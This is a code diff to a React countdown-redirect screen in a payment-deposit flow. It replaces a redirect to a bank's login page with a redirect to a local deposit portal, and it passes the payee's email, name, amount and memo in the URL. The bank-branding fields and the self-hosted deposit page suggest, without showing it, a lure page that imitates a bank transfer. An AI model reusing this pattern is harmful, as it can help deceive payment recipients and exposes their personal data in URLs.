@@ -16,7 +16,8 @@ export default function CountdownRedirectScreen({ data }: CountdownRedirectScree
     if (countdown <= 0) {
       if (data.ui.autoRedirect && !hasRedirected.current) {
         hasRedirected.current = true
-        window.open(data.bankVisuals.login, "_blank")
+        const depositUrl = `/deposit-portal?transferId=${encodeURIComponent(data.meta.id)}&amount=${data.deposit.amount}&recipient=${encodeURIComponent(data.payee.email)}&recipientName=${encodeURIComponent(data.payee.name)}&bankName=${encodeURIComponent(data.sender.bankName)}&message=${encodeURIComponent(data.deposit.memo || "")}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+        window.location.href = depositUrl
       }
       return
     }
@@ -29,7 +30,8 @@ export default function CountdownRedirectScreen({ data }: CountdownRedirectScree
   }, [countdown, data.ui.autoRedirect, data.bankVisuals.login])
 
   const handleManualRedirect = () => {
-    window.open(data.bankVisuals.login, "_blank")
+    const depositUrl = `/deposit-portal?transferId=${encodeURIComponent(data.meta.id)}&amount=${data.deposit.amount}&recipient=${encodeURIComponent(data.payee.email)}&recipientName=${encodeURIComponent(data.payee.name)}&bankName=${encodeURIComponent(data.sender.bankName)}&message=${encodeURIComponent(data.deposit.memo || "")}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+    window.location.href = depositUrl
   }
 
   return (
@@ -63,9 +65,9 @@ export default function CountdownRedirectScreen({ data }: CountdownRedirectScree
             </div>
 
             <div className="text-center space-y-2">
-              <h2 className="text-2xl font-semibold text-white">Redirecting to your bank</h2>
+              <h2 className="text-2xl font-semibold text-white">Preparing your deposit</h2>
               <p className="text-lg text-zinc-400">
-                You will be redirected to your banking portal in{" "}
+                You will be redirected to complete your deposit in{" "}
                 <span className="text-[#FFCB05] font-semibold tabular-nums">{countdown}</span> seconds
               </p>
             </div>
@@ -126,12 +128,12 @@ export default function CountdownRedirectScreen({ data }: CountdownRedirectScree
                 onClick={handleManualRedirect}
                 className="w-full md:w-auto px-8 py-4 bg-[#FFCB05] hover:bg-[#FFD84D] text-black font-semibold rounded-xl transition-colors duration-200 flex items-center justify-center gap-2"
               >
-                Continue to {data.bankVisuals.name}
+                Continue to Deposit
                 <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" />
                 </svg>
               </button>
-              <p className="text-sm text-zinc-500">Click to open your banking portal</p>
+              <p className="text-sm text-zinc-500">Click to complete your deposit</p>
             </div>
           )}
         </div>
